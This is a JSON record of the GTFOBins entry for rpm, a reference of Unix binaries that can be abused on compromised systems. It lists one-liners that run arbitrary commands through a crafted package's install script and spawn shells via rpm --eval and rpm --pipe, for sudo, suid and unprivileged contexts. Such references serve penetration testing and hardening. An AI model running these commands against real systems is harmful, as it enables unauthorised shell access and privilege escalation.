{"title": "rpm", "source": "gtfobins", "source_label": "GTFOBins", "path": "rpm", "html": "<h1>rpm</h1>\n<h2>Command Execution</h2>\n<p>Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho /path/to/command &gt;x.sh\nfpm -n x -s dir -t rpm -a all --before-install x.sh .\n```</p>\n<pre><code class=\"language-bash\">rpm -ivh x-1.0-1.noarch.rpm</code></pre>\n<h2>Inherit</h2>\n<p>This allows to run Lua code (`...`).</p>\n<pre><code class=\"language-bash\">rpm --eval &#x27;%{lua:...}&#x27;</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">rpm --eval &#x27;%(/bin/sh 1&gt;&amp;2)&#x27;</code></pre>\n<pre><code class=\"language-bash\">rpm --pipe &#x27;/bin/sh 0&lt;&amp;1&#x27;</code></pre>", "excerpt": "rpm Command Execution Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command &gt;x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ``` rpm -ivh x-1.0-1.noarch.rpm…", "tags": ["func:command", "func:inherit", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}